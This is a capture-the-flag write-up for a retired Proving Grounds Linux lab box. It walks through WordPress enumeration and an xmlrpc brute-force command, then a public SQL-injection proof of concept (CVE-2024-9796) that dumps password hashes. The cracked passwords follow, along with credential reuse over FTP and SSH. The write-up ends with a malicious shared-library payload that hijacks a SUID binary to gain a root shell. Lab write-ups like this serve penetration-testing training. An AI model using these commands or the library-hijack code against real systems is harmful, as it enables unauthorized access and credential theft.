---
machine: Workaholic
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [wordpress, cve-2024-9796, sql-injection, library-hijacking, suid]
date: 2026-08-15
status: retired
summary: An Ubuntu box running a recent WordPress install — testing a known SQL-injection CVE to dump password hashes, credential reuse across FTP/SSH/the database, and a custom SUID monitoring binary that loads a missing shared library from a predictable path for root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ nmap-full 192.168.107.229                                
[*] Running fast port discovery on 192.168.107.229...
[sudo] password for kali: 
[*] Open ports: 21,22,80
[*] Running full scan on 192.168.107.229...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-15 21:30 -0400
Nmap scan report for 192.168.107.229
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-generator: WordPress 6.7.2
|_http-title: Workaholic
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

Run wpscan to enumerate the wordpress plugins:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ wpscan --url 192.168.107.229                                                             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.107.229/ [192.168.107.229]
[+] Started: Sat Aug 15 21:38:38 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.24.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.107.229/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.107.229/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.107.229/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.2 identified (Insecure, released on 2025-02-11).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.107.229/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.107.229/, Match: 'WordPress 6.7.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Aug 15 21:38:43 2026
[+] Requests Done: 165
[+] Cached Requests: 4
[+] Data Sent: 42.017 KB
[+] Data Received: 354.343 KB
[+] Memory used: 244.273 MB
[+] Elapsed time: 00:00:05
```

We can enumerate the authors of the wordpress by appening /?author=0 and incrementing the number to enumerate the users:

We find: admin, charlie, ted

We can attempt to bruteforce the wp-admin page via xmlrpc:

```bash
┌──(kali㉿kali)-[~/oscp/workaholic]
└─$ wpscan --url http://workaholic.offsec --usernames userlist --passwords /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt --password-attack xmlrpc 
```

## Foothold

Use sqli to obtain credential hashes:
https://github.com/BwithE/CVE-2024-9796/tree/main

```bash
┌──(kali㉿kali)-[~/oscp/workaholic]
└─$ python3 poc.py -i 192.168.107.229                               
[!] 192.168.107.229 has been PWNed!
admin:$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.
charlie:$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.
ted:$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
```

After quite awhile we can crack two hashes with hashcat:
```
hashcat -m 400 userhashes.hash -a 0 /usr/share/wordlists/rockyou.txt

$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/:okadamat17. ted         $P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.:chrish20. charlie
```

We can login to /wp-admin with `ted:okadamat17`.

Neither have administrative access in wp-admin so we try the creds elsewhere:

We can auth to FTP with ted

```bash
┌──(kali㉿kali)-[~/oscp/workaholic]
└─$ ftp 192.168.107.229 21
Connected to 192.168.107.229.
220 (vsFTPd 3.0.5)
Name (192.168.107.229:kali): ted
331 Please specify the password.
Password: 
230 Login successful.
```

We `get` the `wp-config.php` and find database creds

```text
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );

```

If we attempt to spray this against ssh we find that it connects with user `charlie`. We have our foothold and can read local.txt

## Privilege Escalation

For privilege escalation we transfer and run linpeas:

```text
root         880  0.0  1.6 233792 33844 ?        Ss   01:21   0:00 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)
www-data    2857  0.4  2.4 311068 49496 ?        S    02:46   0:18  _ php-fpm: pool www
www-data    2862  0.4  2.6 311524 53880 ?        S    02:47   0:18  _ php-fpm: pool www
www-data    3020  0.0  2.5 311548 51568 ?        S    03:18   0:00  _ php-fpm: pool www

#We could maybe laterally move to www-data reasonably

/var/www/html/wordpress/blog/wp-monitor (Unknown SUID binary!)
```

If we investigate `/var/www/html/wordpress/blog/wp-monitor` more closely we find that it is a linux binary. If we run strings on the binary we find something interesting:

```text
_ITM_registerTMCloneTable
PTE1
u+UH
/var/log/nginx/access.log
Error opening log file
%s - - [%*[^]]] "%s %s %s" %s
POST /wp-login.php
[Warning] Possible brute force attack detected: %s
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
```

We see that it presumably tries to call `/home/ted/.lib/libsecurity.so` in which it's `init_plugin` function is not found.

If we attempt to navigate to the filepath it fails. Following the path more closely we find that `.lib` does not exist within ted's home directory!

```bash
charlie@workaholic:/home/ted$ ls -lah
total 28K
drwxrwxrwx 4 ted     ted     4.0K Aug 16 04:17 .
drwxr-xr-x 5 root    root    4.0K Mar 27  2025 ..
lrwxrwxrwx 1 root    root       9 Mar 27  2025 .bash_history -> /dev/null
-rw-r--r-- 1 ted     ted      220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 ted     ted     3.7K Mar 31  2024 .bashrc
-rw-r--r-- 1 ted     ted      807 Mar 31  2024 .profile
drwxr-xr-x 5 ted     ted     4.0K Mar 27  2025 shared
```

We can make our own malicious .so file and .lib to impersonate the requested .so binary. We write this C code that we can compile into a `.so`.

`mkdir /home/ted/.lib`

##### Malicious .so file C code:

```c
┌──(kali㉿kali)-[~/oscp/tools]
└─$ cat mal.so    
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init_plugin(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    system("id > /tmp/suid-so-ran");
}
```

Compile with `gcc -shared -fPIC mal.c -o libsecurity.so`

We get root and can read the proof.txt:

```bash
charlie@workaholic:~$ cp libsecurity.so /home/ted/.lib/libsecurity.so
charlie@workaholic:~$ /var/www/html/wordpress/blog/wp-monitor
[+] Checking the logs...
root@workaholic:~# whoami
root
```
